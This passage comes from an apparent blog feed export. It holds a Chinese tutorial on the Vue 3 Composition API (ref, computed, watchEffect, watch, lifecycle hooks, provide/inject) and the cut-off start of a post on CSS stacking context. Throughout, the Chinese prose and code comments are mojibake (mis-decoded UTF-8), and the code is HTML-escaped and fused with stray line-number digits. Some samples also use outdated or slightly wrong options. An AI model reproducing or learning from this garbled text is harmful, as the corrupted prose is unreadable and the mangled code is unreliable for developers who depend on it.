åˆ›å»ºçš„å¯¹è±¡çš„å±žæ€§å€¼ï¼ŒåŒæ ·å±žæ€§å€¼ ref() åŒ…è£…å¯¹è±¡ä¹Ÿä¼šæ¨¡ç‰ˆä¸Šä¸‹æ–‡è¢«å±•å¼€ï¼š 1234567891011121314151617&lt;template&gt; &lt;div&gt;reactive ref count: &#123;&#123;state.count&#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; reactive, ref &#125; from '@vue/composition-api'export default &#123; setup() &#123; const count = ref(0) const state = reactive(&#123;count&#125;) return &#123; state // åŒ…è£…å¯¹è±¡ value å±žæ€§è‡ªåŠ¨å±•å¼€ &#125; &#125;&#125;&lt;/script&gt; åœ¨ Vue 2.x ä¸­ç”¨å®žä¾‹ä¸Šçš„ $refs å±žæ€§èŽ·å–æ¨¡ç‰ˆå…ƒç´ ä¸­ ref å±žæ€§æ ‡è®° DOM æˆ–ç»„ä»¶ä¿¡æ¯ï¼Œåœ¨è¿™é‡Œç”¨ ref() åŒ…è£…å¯¹è±¡ä¹Ÿå¯ä»¥ç”¨æ¥å¼•ç”¨é¡µé¢å…ƒç´ å’Œç»„ä»¶ï¼› 123456789101112131415161718192021&lt;template&gt; &lt;div&gt;&lt;p ref="text"&gt;Hello&lt;/p&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; ref &#125; from '@vue/composition-api'export default &#123; setup() &#123; const text = ref(null) setTimeout(() =&gt; &#123; console.log('text: ', text.value.innerHTML) &#125;, 1000) return &#123; text &#125; &#125;&#125;// æ‰“å°ç»“æžœï¼š// text: Hello&lt;/script&gt; unref()å¦‚æžœå‚æ•°æ˜¯ä¸€ä¸ª ref åˆ™è¿”å›žå®ƒçš„ valueï¼Œå¦åˆ™è¿”å›žå‚æ•°æœ¬èº«ã€‚å®ƒæ˜¯ val = isRef(val) ? val.value : val çš„è¯­æ³•ç³–ã€‚ isref()æ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦ä¸ºä¸€ä¸ª ref å¯¹è±¡ã€‚ toRefs()æŠŠä¸€ä¸ªå“åº”å¼å¯¹è±¡è½¬æ¢æˆæ™®é€šå¯¹è±¡ï¼Œè¯¥æ™®é€šå¯¹è±¡çš„æ¯ä¸ª property éƒ½æ˜¯ä¸€ä¸ª ref ï¼Œå’Œå“åº”å¼å¯¹è±¡ property ä¸€ä¸€å¯¹åº”ã€‚å¹¶ä¸”ï¼Œå½“æƒ³è¦ä»Žä¸€ä¸ªç»„åˆé€»è¾‘å‡½æ•°ä¸­è¿”å›žå“åº”å¼å¯¹è±¡æ—¶ï¼Œç”¨ toRefs æ˜¯å¾ˆæœ‰æ•ˆçš„ï¼Œè¯¥ API è®©æ¶ˆè´¹ç»„ä»¶å¯ä»¥ è§£æž„ / æ‰©å±•ï¼ˆä½¿ç”¨ ... æ“ä½œç¬¦ï¼‰è¿”å›žçš„å¯¹è±¡ï¼Œå¹¶ä¸ä¼šä¸¢å¤±å“åº”æ€§ï¼š 123456789101112131415161718192021222324252627&lt;template&gt; &lt;div&gt; &lt;p&gt;count: &#123;&#123;count&#125;&#125;&lt;/p&gt; &lt;button @click="increment"&gt;+1&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; reactive, toRefs &#125; from '@vue/composition-api'export default &#123; setup() &#123; const state = reactive(&#123; count: 0 &#125;) const increment = () =&gt; &#123; state.count++ &#125; return &#123; ...toRefs(state), // è§£æž„å‡ºæ¥ä¸ä¸¢å¤±å“åº”æ€§ increment &#125; &#125;&#125;&lt;/script&gt; computed()computed() ç”¨æ¥åˆ›å»ºè®¡ç®—å±žæ€§ï¼Œcomputed() å‡½æ•°çš„è¿”å›žå€¼æ˜¯ä¸€ä¸ª ref çš„å®žä¾‹ã€‚è¿™ä¸ªå€¼æ¨¡å¼æ˜¯åªè¯»çš„ï¼š 123456789101112131415import &#123; ref, computed &#125; from '@vue/composition-api'export default &#123; setup() &#123; const count = ref(0) const plusOne = computed(() =&gt; count.value + 1) plusOne.value = 10 console.log('plusOne.value: ', plusOne.value) console.log('count.value: ', count.value) &#125;&#125;// æ‰“å°ç»“æžœï¼š// [Vue warn]: Computed property was assigned to but it has no setter.// plusOne.value: 1// count.value: 0 æˆ–è€…ä¼ å…¥ä¸€ä¸ªæ‹¥æœ‰ get å’Œ set å‡½æ•°çš„å¯¹è±¡ï¼Œåˆ›å»ºä¸€ä¸ªå¯æ‰‹åŠ¨ä¿®æ”¹çš„è®¡ç®—çŠ¶æ€ï¼š 12345678910111213141516171819import &#123; ref, computed &#125; from '@vue/composition-api'export default &#123; setup() &#123; const count = ref(0) const plusOne = computed(&#123; get: () =&gt; count.value + 1, set: val =&gt; &#123; count.value = val - 1 &#125; &#125;) plusOne.value = 10 console.log('plusOne.value: ', plusOne.value) console.log('count.value: ', count.value) &#125;&#125;// æ‰“å°ç»“æžœï¼š// plusOne.value: 10// count.value: 9 watchEffect()watchEffect() ç›‘æµ‹å‰¯ä½œç”¨å‡½æ•°ã€‚ç«‹å³æ‰§è¡Œä¼ å…¥çš„ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶å“åº”å¼è¿½è¸ªå…¶ä¾èµ–ï¼Œå¹¶åœ¨å…¶ä¾èµ–å˜æ›´æ—¶é‡æ–°è¿è¡Œè¯¥å‡½æ•°ï¼š 12345678910111213141516171819202122232425262728&lt;template&gt; &lt;div&gt; &lt;p&gt;count: &#123;&#123;count&#125;&#125;&lt;/p&gt; &lt;button @click="increment"&gt;+1&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; ref, watchEffect &#125; from '@vue/composition-api'export default &#123; setup() &#123; // ç›‘è§† ref æ•°æ®æº const count = ref(0) // ç›‘è§†ä¾èµ–æœ‰å˜åŒ–ï¼Œç«‹åˆ»æ‰§è¡Œ watchEffect(() =&gt; &#123; console.log('count.value: ', count.value) &#125;) const increment = () =&gt; &#123; count.value++ &#125; return &#123; count, increment &#125; &#125;&#125;&lt;/script&gt; åœæ­¢ä¾¦å¬ã€‚å½“ watchEffect åœ¨ç»„ä»¶çš„ setup() å‡½æ•°æˆ–ç”Ÿå‘½å‘¨æœŸé’©å­è¢«è°ƒç”¨æ—¶ï¼Œ ä¾¦å¬å™¨ä¼šè¢«é“¾æŽ¥åˆ°è¯¥ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸï¼Œå¹¶åœ¨ç»„ä»¶å¸è½½æ—¶è‡ªåŠ¨åœæ­¢ã€‚ åœ¨ä¸€äº›æƒ…å†µä¸‹ï¼ˆæ¯”å¦‚è¶…æ—¶å°±æ— éœ€ç»§ç»­ç›‘å¬å˜åŒ–ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¾å¼è°ƒç”¨è¿”å›žå€¼ä»¥åœæ­¢ä¾¦å¬ï¼š 123456789101112131415161718192021222324252627282930313233&lt;template&gt; &lt;div&gt; &lt;p&gt;count: &#123;&#123;state.count&#125;&#125;&lt;/p&gt; &lt;button @click="increment"&gt;+1&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; reactive, watchEffect &#125; from '@vue/composition-api'export default &#123; setup() &#123; // ç›‘è§† reactive æ•°æ®æº const state = reactive(&#123; count: 0 &#125;) const stop = watchEffect(() =&gt; &#123; console.log('state.count: ', state.count) &#125;) setTimeout(() =&gt; &#123; stop() &#125;, 3000) const increment = () =&gt; &#123; state.count++ &#125; return &#123; state, increment &#125; &#125;&#125;// 3ç§’åŽï¼Œç‚¹å‡»+1æŒ‰é’®ä¸å†æ‰“å°&lt;/script&gt; æ¸…é™¤å‰¯ä½œç”¨ã€‚æœ‰æ—¶å€™å½“è§‚å¯Ÿçš„æ•°æ®æºå˜åŒ–åŽï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¯¹ä¹‹å‰æ‰€æ‰§è¡Œçš„å‰¯ä½œç”¨è¿›è¡Œæ¸…ç†ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œä¸€ä¸ªå¼‚æ­¥æ“ä½œåœ¨å®Œæˆä¹‹å‰æ•°æ®å°±äº§ç”Ÿäº†å˜åŒ–ï¼Œæˆ‘ä»¬å¯èƒ½è¦æ’¤é”€è¿˜åœ¨ç­‰å¾…çš„å‰ä¸€ä¸ªæ“ä½œã€‚ä¸ºäº†å¤„ç†è¿™ç§æƒ…å†µï¼ŒwatchEffect çš„å›žè°ƒä¼šæŽ¥æ”¶åˆ°ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æ³¨å†Œæ¸…ç†æ“ä½œçš„å‡½æ•°ã€‚è°ƒç”¨è¿™ä¸ªå‡½æ•°å¯ä»¥æ³¨å†Œä¸€ä¸ªæ¸…ç†å‡½æ•°ã€‚æ¸…ç†å‡½æ•°ä¼šåœ¨ä¸‹å±žæƒ…å†µä¸‹è¢«è°ƒç”¨ï¼š å‰¯ä½œç”¨å³å°†é‡æ–°æ‰§è¡Œæ—¶ ä¾¦å¬å™¨è¢«åœæ­¢ (å¦‚æžœåœ¨ setup() æˆ– ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ä¸­ä½¿ç”¨äº† watchEffect, åˆ™åœ¨å¸è½½ç»„ä»¶æ—¶) æˆ‘ä»¬ä¹‹æ‰€ä»¥æ˜¯é€šè¿‡ä¼ å…¥ä¸€ä¸ªå‡½æ•°åŽ»æ³¨å†Œå¤±æ•ˆå›žè°ƒï¼Œè€Œä¸æ˜¯ä»Žå›žè°ƒè¿”å›žå®ƒï¼ˆå¦‚ React useEffect ä¸­çš„æ–¹å¼ï¼‰ï¼Œæ˜¯å› ä¸ºè¿”å›žå€¼å¯¹äºŽå¼‚æ­¥é”™è¯¯å¤„ç†å¾ˆé‡è¦ã€‚ 1234const data = ref(null)watchEffect(async (id) =&gt; &#123; data.value = await fetchData(id)&#125;) async function éšæ€§åœ°è¿”å›žä¸€ä¸ª Promise - è¿™æ ·çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•è¿”å›žä¸€ä¸ªéœ€è¦è¢«ç«‹åˆ»æ³¨å†Œçš„æ¸…ç†å‡½æ•°çš„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå›žè°ƒè¿”å›žçš„ Promise è¿˜ä¼šè¢« `Vue ç”¨äºŽå†…éƒ¨çš„å¼‚æ­¥é”™è¯¯å¤„ç†ã€‚ åœ¨å®žé™…åº”ç”¨ä¸­ï¼Œåœ¨å¤§äºŽæŸä¸ªé¢‘çŽ‡ï¼ˆè¯·æ±‚ paddingçŠ¶æ€ï¼‰æ“ä½œæ—¶ï¼Œå¯ä»¥å…ˆå–æ¶ˆä¹‹å‰æ“ä½œï¼ŒèŠ‚çº¦èµ„æºï¼š 12345678910111213141516171819202122232425262728293031323334353637&lt;template&gt; &lt;div&gt; &lt;input type="text" v-model="keyword"&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; ref, watchEffect &#125; from '@vue/composition-api'export default &#123; setup() &#123; const keyword = ref('') const asyncPrint = val =&gt; &#123; return setTimeout(() =&gt; &#123; console.log('user input: ', val) &#125;, 1000) &#125; watchEffect( onInvalidate =&gt; &#123; const timer = asyncPrint(keyword.value) onInvalidate(() =&gt; clearTimeout(timer)) console.log('keyword change: ', keyword.value) &#125;, &#123; flush: 'post' // é»˜è®¤'post'ï¼ŒåŒæ­¥'sync'ï¼Œ'pre'ç»„ä»¶æ›´æ–°ä¹‹å‰ &#125; ) return &#123; keyword &#125; &#125;&#125;// å®žçŽ°å¯¹ç”¨æˆ·è¾“å…¥â€œé˜²æŠ–â€æ•ˆæžœ&lt;/script&gt; watch()watch API å®Œå…¨ç­‰æ•ˆäºŽ 2.x this.$watch ï¼ˆä»¥åŠ watch ä¸­ç›¸åº”çš„é€‰é¡¹ï¼‰ã€‚watch éœ€è¦ä¾¦å¬ç‰¹å®šçš„æ•°æ®æºï¼Œå¹¶åœ¨å›žè°ƒå‡½æ•°ä¸­æ‰§è¡Œå‰¯ä½œç”¨ã€‚é»˜è®¤æƒ…å†µæ˜¯æ‡’æ‰§è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä»…åœ¨ä¾¦å¬çš„æºå˜æ›´æ—¶æ‰æ‰§è¡Œå›žè°ƒã€‚ watch() æŽ¥æ”¶çš„ç¬¬ä¸€ä¸ªå‚æ•°è¢«ç§°ä½œ â€œæ•°æ®æºâ€ï¼Œå®ƒå¯ä»¥æ˜¯ï¼š ä¸€ä¸ªè¿”å›žä»»æ„å€¼çš„å‡½æ•° ä¸€ä¸ªåŒ…è£…å¯¹è±¡ ä¸€ä¸ªåŒ…å«ä¸Šè¿°ä¸¤ç§æ•°æ®æºçš„æ•°ç»„ ç¬¬äºŒä¸ªå‚æ•°æ˜¯å›žè°ƒå‡½æ•°ã€‚å›žè°ƒå‡½æ•°åªæœ‰å½“æ•°æ®æºå‘ç”Ÿå˜åŠ¨æ—¶æ‰ä¼šè¢«è§¦å‘ï¼š 123456789101112watch( // getter () =&gt; count.value + 1, // callback (value, oldValue) =&gt; &#123; console.log('count + 1 is: ', value) &#125;)// -&gt; count + 1 is: 1count.value++// -&gt; count + 1 is: 2 ä¸Šé¢æåˆ°ç¬¬ä¸€ä¸ªå‚æ•°çš„â€œæ•°æ®æºâ€å¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«å‡½æ•°å’ŒåŒ…è£…å¯¹è±¡çš„æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥åŒæ—¶ç›‘å¬å¤šä¸ªæ•°æ®æºã€‚åŒæ—¶ï¼Œwatch å’Œ watchEffect åœ¨åœæ­¢ä¾¦å¬, æ¸…é™¤å‰¯ä½œç”¨ (ç›¸åº”åœ° onInvalidate ä¼šä½œä¸ºå›žè°ƒçš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¼ å…¥)ï¼Œç­‰æ–¹é¢è¡Œä¸ºä¸€è‡´ã€‚ä¸‹é¢ç”¨ä¸Šé¢â€œé˜²æŠ–â€ä¾‹å­ç”¨ watch æ”¹å†™ï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;template&gt; &lt;div&gt; &lt;input type="text" v-model="keyword"&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; ref, watch &#125; from '@vue/composition-api'export default &#123; setup() &#123; const keyword = ref('') const asyncPrint = val =&gt; &#123; return setTimeout(() =&gt; &#123; console.log('user input: ', val) &#125;) &#125; watch( keyword, (newVal, oldVal, onCleanUp) =&gt; &#123; const timer = asyncPrint(keyword) onCleanUp(() =&gt; clearTimeout(timer)) &#125;, &#123; lazy: true // é»˜è®¤æœªfalseï¼Œå³åˆå§‹ç›‘å¬å›žè°ƒå‡½æ•°æ‰§è¡Œäº† &#125; ) return &#123; keyword &#125; &#125;&#125;&lt;/script&gt; å’Œ 2.x çš„ $watch æœ‰æ‰€ä¸åŒçš„æ˜¯ï¼Œwatch() çš„å›žè°ƒä¼šåœ¨åˆ›å»ºæ—¶å°±æ‰§è¡Œä¸€æ¬¡ã€‚è¿™æœ‰ç‚¹ç±»ä¼¼ 2.x watcher çš„ immediate: true é€‰é¡¹ï¼Œä½†æœ‰ä¸€ä¸ªé‡è¦çš„ä¸åŒï¼šé»˜è®¤æƒ…å†µä¸‹ watch() çš„å›žè°ƒæ€»æ˜¯ä¼šåœ¨å½“å‰çš„ renderer flush ä¹‹åŽæ‰è¢«è°ƒç”¨ â€”â€” æ¢å¥è¯è¯´ï¼Œwatch()çš„å›žè°ƒåœ¨è§¦å‘æ—¶ï¼ŒDOM æ€»æ˜¯ä¼šåœ¨ä¸€ä¸ªå·²ç»è¢«æ›´æ–°è¿‡çš„çŠ¶æ€ä¸‹ã€‚ è¿™ä¸ªè¡Œä¸ºæ˜¯å¯ä»¥é€šè¿‡é€‰é¡¹æ¥å®šåˆ¶çš„ã€‚ åœ¨ 2.x çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°åŒä¸€ä»½é€»è¾‘éœ€è¦åœ¨ mounted å’Œä¸€ä¸ª watcher çš„å›žè°ƒä¸­æ‰§è¡Œï¼ˆæ¯”å¦‚æ ¹æ®å½“å‰çš„ id æŠ“å–æ•°æ®ï¼‰ï¼Œ3.0 çš„ watch() é»˜è®¤è¡Œä¸ºå¯ä»¥ç›´æŽ¥è¡¨è¾¾è¿™æ ·çš„éœ€æ±‚ã€‚ ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°å¯ä»¥ç›´æŽ¥å¯¼å…¥ onXXX ä¸€æ—çš„å‡½æ•°æ¥æ³¨å†Œç”Ÿå‘½å‘¨æœŸé’©å­ã€‚ 123456789101112131415import &#123; onMounted, onUpdated, onUnmounted &#125; from '@vue/composition-api'const MyComponent = &#123; setup() &#123; onMounted(() =&gt; &#123; console.log('mounted!') &#125;) onUpdated(() =&gt; &#123; console.log('updated!') &#125;) onUnmounted(() =&gt; &#123; console.log('unmounted!') &#125;) &#125;,&#125; è¿™äº›ç”Ÿå‘½å‘¨æœŸé’©å­æ³¨å†Œå‡½æ•°åªèƒ½åœ¨ setup() æœŸé—´åŒæ­¥ä½¿ç”¨ï¼Œ å› ä¸ºå®ƒä»¬ä¾èµ–äºŽå†…éƒ¨çš„å…¨å±€çŠ¶æ€æ¥å®šä½å½“å‰ç»„ä»¶å®žä¾‹ï¼ˆæ­£åœ¨è°ƒç”¨ setup() çš„ç»„ä»¶å®žä¾‹ï¼‰, ä¸åœ¨å½“å‰ç»„ä»¶ä¸‹è°ƒç”¨è¿™äº›å‡½æ•°ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚ ç»„ä»¶å®žä¾‹ä¸Šä¸‹æ–‡ä¹Ÿæ˜¯åœ¨ç”Ÿå‘½å‘¨æœŸé’©å­åŒæ­¥æ‰§è¡ŒæœŸé—´è®¾ç½®çš„ï¼Œå› æ­¤ï¼Œåœ¨å¸è½½ç»„ä»¶æ—¶ï¼Œåœ¨ç”Ÿå‘½å‘¨æœŸé’©å­å†…éƒ¨åŒæ­¥åˆ›å»ºçš„ä¾¦å¬å™¨å’Œè®¡ç®—çŠ¶æ€ä¹Ÿå°†è‡ªåŠ¨åˆ é™¤ã€‚ 2.x çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ä¸Žæ–°ç‰ˆ Composition API ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼š beforeCreate -&gt; ä½¿ç”¨ setup() created -&gt; ä½¿ç”¨ setup() beforeMount -&gt; onBeforeMount mounted -&gt; onMounted beforeUpdate -&gt; onBeforeUpdate updated -&gt; onUpdated beforeDestroy -&gt; onBeforeUnmount destroyed -&gt; onUnmounted errorCaptured -&gt; onErrorCaptured æ³¨æ„ï¼šbeforeCreate å’Œ created åœ¨ Vue3 ä¸­å·²ç»ç”± setup æ›¿ä»£ã€‚ ä¾èµ–æ³¨å…¥provide å’Œ inject æä¾›ä¾èµ–æ³¨å…¥ï¼ŒåŠŸèƒ½ç±»ä¼¼ 2.x çš„ provide/injectã€‚ä¸¤è€…éƒ½åªèƒ½åœ¨å½“å‰æ´»åŠ¨ç»„ä»¶å®žä¾‹çš„ setup() ä¸­è°ƒç”¨ã€‚ å¯ä»¥ä½¿ç”¨ ref æ¥ä¿è¯ provided å’Œ injected ä¹‹é—´å€¼çš„å“åº”ã€‚ çˆ¶ä¾èµ–æ³¨å…¥ï¼Œä½œä¸ºæä¾›è€…ï¼Œä¼ ç»™å­ç»„ä»¶ï¼š 123456789101112131415161718import &#123; ref, provide &#125; from '@vue/composition-api'import ComParent from './ComParent.vue'export default &#123; components: &#123; ComParent &#125;, setup() &#123; let treasure = ref('ä¼ å›½çŽ‰çŽº') provide('treasure', treasure) setTimeout(() =&gt; &#123; treasure.value = 'å°šæ–¹å®å‰‘' &#125;, 1000) return &#123; treasure &#125; &#125;&#125; å­ä¾èµ–æ³¨å…¥ï¼Œå¯ä½œä¸ºä½¿ç”¨è€…ï¼š 1234567891011121314import &#123; inject &#125; from '@vue/composition-api'import ComChild from './ComChild.vue'export default &#123; components: &#123; ComChild &#125;, setup() &#123; const treasure = inject('treasure') return &#123; treasure &#125; &#125;&#125; å­™ç»„ä»¶ä¾èµ–æ³¨å…¥ï¼Œä½œä¸ºä½¿ç”¨è€…ä½¿ç”¨ï¼Œå½“ç¥–çº§ä¾èµ–ä¼ å…¥çš„å€¼æ”¹å˜æ—¶ï¼Œä¹Ÿèƒ½å“åº”ï¼š 12345678import &#123; inject &#125; from '@vue/composition-api'export default &#123; setup() &#123; const treasure = inject('treasure') console.log('treasure: ', treasure) &#125;&#125; ç¼ºç‚¹/æ½œåœ¨é—®é¢˜ æ–°çš„ API ä½¿å¾—åŠ¨æ€åœ°æ£€è§†/ä¿®æ”¹ä¸€ä¸ªç»„ä»¶çš„é€‰é¡¹å˜å¾—æ›´å›°éš¾ï¼ˆåŽŸæ¥æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒçŽ°åœ¨æ˜¯ä¸€æ®µæ— æ³•è¢«æ£€è§†çš„å‡½æ•°ä½“ï¼‰ã€‚ è¿™å¯èƒ½æ˜¯ä¸€ä»¶å¥½äº‹ï¼Œå› ä¸ºé€šå¸¸åœ¨ç”¨æˆ·ä»£ç ä¸­åŠ¨æ€åœ°æ£€è§†/ä¿®æ”¹ç»„ä»¶æ˜¯ä¸€ç±»æ¯”è¾ƒå±é™©çš„æ“ä½œï¼Œå¯¹äºŽè¿è¡Œæ—¶ä¹Ÿå¢žåŠ äº†è®¸å¤šæ½œåœ¨çš„è¾¹ç¼˜æƒ…å†µï¼ˆç‰¹åˆ«æ˜¯ç»„ä»¶ç»§æ‰¿å’Œä½¿ç”¨ mixin çš„æƒ…å†µä¸‹ï¼‰ã€‚æ–° API çš„çµæ´»æ€§åº”è¯¥åœ¨ç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½å¯ä»¥ç”¨æ›´æ˜¾å¼çš„ä»£ç è¾¾æˆåŒæ ·çš„ç»“æžœã€‚ ç¼ºä¹ç»éªŒçš„ç”¨æˆ·å¯èƒ½ä¼šå†™å‡º â€œé¢æ¡ä»£ç â€ï¼Œå› ä¸ºæ–° API ä¸åƒæ—§ API é‚£æ ·å¼ºåˆ¶å°†ç»„ä»¶ä»£ç åŸºäºŽé€‰é¡¹åˆ‡åˆ†å¼€æ¥ã€‚ åŸºäºŽå‡½æ•°çš„æ–° API å’ŒåŸºäºŽé€‰é¡¹çš„æ—§ API ä¹‹é—´çš„æœ€å¤§åŒºåˆ«ï¼Œå°±æ˜¯æ–° API è®©æŠ½å–é€»è¾‘å˜å¾—éžå¸¸ç®€å• â€”â€” å°±è·Ÿåœ¨æ™®é€šçš„ä»£ç ä¸­æŠ½å–å‡½æ•°ä¸€æ ·ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸å¿…åªåœ¨éœ€è¦å¤ç”¨é€»è¾‘çš„æ—¶å€™æ‰æŠ½å–å‡½æ•°ï¼Œä¹Ÿå¯ä»¥å•çº¯ä¸ºäº†æ›´å¥½åœ°ç»„ç»‡ä»£ç åŽ»æŠ½å–å‡½æ•°ã€‚ åŸºäºŽé€‰é¡¹çš„ä»£ç åªæ˜¯çœ‹ä¸ŠåŽ»æ›´æ•´æ´ã€‚ä¸€ä¸ªå¤æ‚çš„ç»„ä»¶å¾€å¾€éœ€è¦åŒæ—¶å¤„ç†å¤šä¸ªä¸åŒçš„é€»è¾‘ä»»åŠ¡ï¼Œæ¯ä¸ªé€»è¾‘ä»»åŠ¡æ‰€æ¶‰åŠçš„ä»£ç åœ¨é€‰é¡¹ API ä¸‹æ˜¯è¢«åˆ†æ•£åœ¨å¤šä¸ªé€‰é¡¹ä¹‹ä¸­çš„ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œä»ŽæœåŠ¡ç«¯æŠ“å–ä¸€ä»½æ•°æ®ï¼Œå¯èƒ½éœ€è¦ç”¨åˆ° props, data(), mounted å’Œ watchã€‚æžç«¯æƒ…å†µä¸‹ï¼Œå¦‚æžœæˆ‘ä»¬æŠŠä¸€ä¸ªåº”ç”¨ä¸­æ‰€æœ‰çš„é€»è¾‘ä»»åŠ¡éƒ½æ”¾åœ¨ä¸€ä¸ªç»„ä»¶é‡Œï¼Œè¿™ä¸ªç»„ä»¶å¿…ç„¶ä¼šå˜å¾—åºžå¤§è€Œéš¾ä»¥ç»´æŠ¤ï¼Œå› ä¸ºæ¯ä¸ªé€»è¾‘ä»»åŠ¡çš„ä»£ç éƒ½è¢«é€‰é¡¹åˆ‡æˆäº†å¤šä¸ªç¢Žç‰‡åˆ†æ•£åœ¨å„å¤„ã€‚ å¯¹æ¯”ä¹‹ä¸‹ï¼ŒåŸºäºŽå‡½æ•°çš„ API è®©æˆ‘ä»¬å¯ä»¥æŠŠæ¯ä¸ªé€»è¾‘ä»»åŠ¡çš„ä»£ç éƒ½æ•´ç†åˆ°ä¸€ä¸ªå¯¹åº”çš„å‡½æ•°ä¸­ã€‚å½“æˆ‘ä»¬å‘çŽ°ä¸€ä¸ªç»„ä»¶å˜å¾—è¿‡å¤§æ—¶ï¼Œæˆ‘ä»¬ä¼šå°†å®ƒåˆ‡åˆ†æˆå¤šä¸ªæ›´å°çš„ç»„ä»¶ï¼›åŒæ ·åœ°ï¼Œå¦‚æžœä¸€ä¸ªç»„ä»¶çš„ setup() å‡½æ•°å˜å¾—å¾ˆå¤æ‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒåˆ‡åˆ†æˆå¤šä¸ªæ›´å°çš„å‡½æ•°ã€‚è€Œå¦‚æžœæ˜¯åŸºäºŽé€‰é¡¹ï¼Œåˆ™æ— æ³•åšåˆ°è¿™æ ·çš„åˆ‡åˆ†ï¼Œå› ä¸ºç”¨ mixin åªä¼šè®©äº‹æƒ…å˜å¾—æ›´ç³Ÿç³•ã€‚ æ€»ç»“Vue 3.0 çš„ API çš„è°ƒæ•´å…¶å®žå¹¶ä¸å¤§ï¼Œç†Ÿæ‚‰ 2.x çš„ç«¥éž‹å°±ä¼šæœ‰ä¸€ç§ä¼¼æ›¾ç›¸è¯†çš„æ„Ÿè§‰ï¼Œè¿‡æ¸¡æˆæœ¬æžå°ã€‚æ›´å¤šæ˜¯æºç å±‚é¢çš„é‡æž„ï¼Œè®©å…¶æ›´å¥½ç”¨ï¼ˆä»Žé€‰é¡¹å¼åˆ°å‡½æ•°å¼ï¼ŒåŸºäºŽ typescript é‡å†™ï¼Œå¼ºåˆ¶ç±»åž‹æ£€æŸ¥å’Œæç¤ºè¡¥å…¨ï¼‰ï¼Œæ€§èƒ½æ›´å¼ºï¼ˆé‡å†™äº†è™šæ‹Ÿ Dom çš„å®žçŽ°ï¼Œé‡‡ç”¨åŽŸç”Ÿ Proxy ç›‘å¬ï¼‰ã€‚ æœ¬æ–‡æ¡ˆä¾‹ä»£ç å¯ä»¥æˆ³è¿™é‡Œ æœ¬æ–‡å‚è€ƒäº†ï¼š Vue Function-based API RFCVue Composition APIæŠ„ç¬”è®°ï¼šå°¤é›¨æºªåœ¨Vue3.0 Betaç›´æ’­é‡ŒèŠåˆ°äº†è¿™äº›â€¦å®Œï½ž]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSSä¸­å±‚å ä¸Šä¸‹æ–‡è¿›æ¥äº†è§£ä¸€ä¸‹ï¼Ÿ]]></title>
    <url>%2F2020%2F01%2F07%2Fstacking-context-order%2F</url>
    <content type="text"><![CDATA[å‰è¨€åœ¨æœ‰äº› CSS ç›¸äº’å½±å“ä½œç”¨ä¸‹ï¼Œå¯¹å…ƒç´ è®¾ç½®çš„ z-index å¹¶ä¸ä¼šæŒ‰å®žé™…å¤§å°å åŠ ï¼Œä¸€ç›´ä¸æ˜Žç™½å…¶ä¸­çš„åŽŸç†ï¼Œæœ€è¿‘ç‰¹æ„æŸ¥äº†ä¸€ä¸‹ç›¸å…³èµ„æ–™ï¼Œåšä¸€ä¸ªå°æ€»ç»“ã€‚é‚£ä¹ˆï¼ŒçŽ°åœ¨å°±å¼€å§‹ã€‚ å±‚å ä¸Šä¸‹æ–‡ä¸Žå±‚å é¡ºåºå±‚å ä¸Šä¸‹æ–‡ï¼ˆstacking contentï¼‰æ˜¯ HTML ä¸­çš„ä¸‰ç»´æ¦‚å¿µï¼Œä¹Ÿå°±æ˜¯å…ƒç´ zè½´ã€‚å±‚å é¡ºåºï¼ˆstacking orderï¼‰è¡¨ç¤ºå±‚å æ—¶æœ‰ç€ç‰¹å®šçš„åž‚ç›´æ˜¾ç¤ºé¡ºåºã€‚ å±‚å å‡†åˆ™ è°å¤§è°ä¸Š å½“å…·æœ‰æ˜Žæ˜¾çš„å±‚å æ°´å¹³æ ‡ç¤ºçš„æ—¶å€™ï¼Œå¦‚è¯†åˆ«çš„ z-indx å€¼ï¼Œåœ¨åŒä¸€ä¸ªå±‚å ä¸Šä¸‹æ–‡é¢†åŸŸï¼Œå±‚å æ°´å¹³å€¼å¤§çš„é‚£ä¸€ä¸ªè¦†ç›–å°çš„é‚£ä¸€ä¸ªã€‚ åŽæ¥å±…ä¸Š å½“å…ƒç´ çš„å±‚å æ°´å¹³ä¸€è‡´ã€å±‚å é¡ºåºç›¸åŒçš„æ—¶å€™ï¼Œåœ¨DOMæµä¸­å¤„äºŽåŽé¢çš„å…ƒç´ ä¼šè¦†ç›–å‰é¢çš„å…ƒç´ ã€‚ å±‚å ä¸Šä¸‹æ–‡çš„ç‰¹æ€§å±‚å 